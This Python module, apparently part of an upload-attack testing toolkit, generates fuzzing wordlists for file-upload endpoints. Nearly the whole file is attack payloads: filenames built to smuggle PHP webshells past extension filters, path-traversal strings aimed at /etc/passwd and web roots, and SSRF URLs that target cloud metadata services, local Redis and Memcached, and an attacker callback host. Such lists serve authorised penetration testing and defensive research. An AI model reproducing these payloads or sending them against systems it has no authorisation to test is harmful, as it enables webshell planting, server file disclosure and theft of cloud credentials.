"""Parameter / request fuzzing wordlists for upload endpoints.

These are not files to upload but wordlists to drive Burp Intruder / ffuf /
wfuzz against the upload request itself: parameter names, filename values,
traversal strings, and SSRF URLs for fetch-style upload params."""
from __future__ import annotations

from ..core import register, Context, Artifact

# Common field names for the file part / sibling params on upload endpoints.
PARAM_NAMES = [
    "file", "files", "files[]", "upload", "uploads", "image", "images",
    "img", "photo", "picture", "avatar", "attachment", "attachments",
    "document", "doc", "media", "video", "audio", "data", "content",
    "filename", "file_name", "name", "path", "dir", "folder", "destination",
    "url", "uri", "src", "source", "link", "fetch", "import", "remote",
    "userfile", "uploadfile", "fileToUpload", "profile_pic", "logo",
    "background", "banner", "thumbnail", "icon", "resource", "asset",
]

# Filename values to fuzz the filename field with.
FILENAME_VALUES = [
    "shell.php", "shell.php.jpg", "shell.jpg.php", "shell.pHp", "shell.php%00.jpg",
    "shell.php;.jpg", "shell.php .jpg", "shell.php%20", "shell.php....",
    "shell.php::$DATA", "shell.phar", "shell.phtml", "shell.php5",
    ".htaccess", "web.config", "shell.svg", "shell.html",
    "../shell.php", "../../shell.php", "....//shell.php",
    "%2e%2e%2fshell.php", "..%252f..%252fshell.php",
    "\u202ephp.jpg",  # RTL override
    "a" * 255 + ".php",  # long name
]

# Path-traversal strings for "path"/"dir"/"filename" sink params.
TRAVERSAL = [
    "../", "..%2f", "..%252f", "....//", "..%c0%af", "..\\",
    "/etc/passwd", "../../../../etc/passwd",
    "....\\\\", "..%5c", "%2e%2e%2f", "%2e%2e/", "..././",
    "/var/www/html/", "C:\\inetpub\\wwwroot\\",
]

# SSRF targets for params that fetch a remote file server-side.
SSRF_URLS = [
    "http://127.0.0.1/", "http://localhost/", "http://127.0.0.1:80/",
    "http://169.254.169.254/latest/meta-data/",          # AWS IMDS
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://[::1]/", "http://0.0.0.0/", "http://2130706433/",  # decimal IP
    "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/", "http://{callback}/ssrf",
]


def _emit(ctx: Context, name: str, lines: list[str], desc: str, usage: str,
          ref="CWE-434"):
    data = "\n".join(lines) + "\n"
    return Artifact(
        relpath=f"wordlists/fuzz/{name}", data=data, technique="param-fuzz",
        category="fuzzing", risk="safe", description=desc, usage=usage,
        reference=ref,
    )


@register("param-fuzz", category="fuzzing", risk="safe",
          description="Wordlists for fuzzing upload parameters and requests.",
          reference="CWE-434")
def param_fuzz(ctx: Context):
    ssrf = [u.replace("{callback}", ctx.callback_host) for u in SSRF_URLS]
    yield _emit(ctx, "param_names.txt", PARAM_NAMES,
                f"{len(PARAM_NAMES)} upload parameter names.",
                "Fuzz the multipart field name / sibling params.")
    yield _emit(ctx, "filenames.txt", FILENAME_VALUES,
                f"{len(FILENAME_VALUES)} filename values.",
                "Fuzz the filename= of the file part.")
    yield _emit(ctx, "path_traversal.txt", TRAVERSAL,
                f"{len(TRAVERSAL)} traversal strings.",
                "Fuzz path/dir/filename params that build a server path.",
                ref="CWE-22")
    yield _emit(ctx, "ssrf_urls.txt", ssrf,
                f"{len(ssrf)} SSRF URLs.",
                "Fuzz url/fetch/import params that pull a remote file.",
                ref="CWE-918")
